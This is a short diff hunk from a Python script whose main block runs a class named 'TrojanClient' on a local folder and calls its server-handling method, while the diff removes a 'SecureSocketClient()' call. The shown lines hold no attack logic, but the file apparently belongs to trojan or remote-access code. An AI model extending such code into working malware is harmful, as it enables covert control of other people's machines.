@@ -140,6 +140,5 @@ class TrojanClient:
 if __name__ == "__main__":
     FOLDER = "D:\check"
 
-    SecureSocketClient()
     client = TrojanClient(FOLDER)
     client.handle_server()
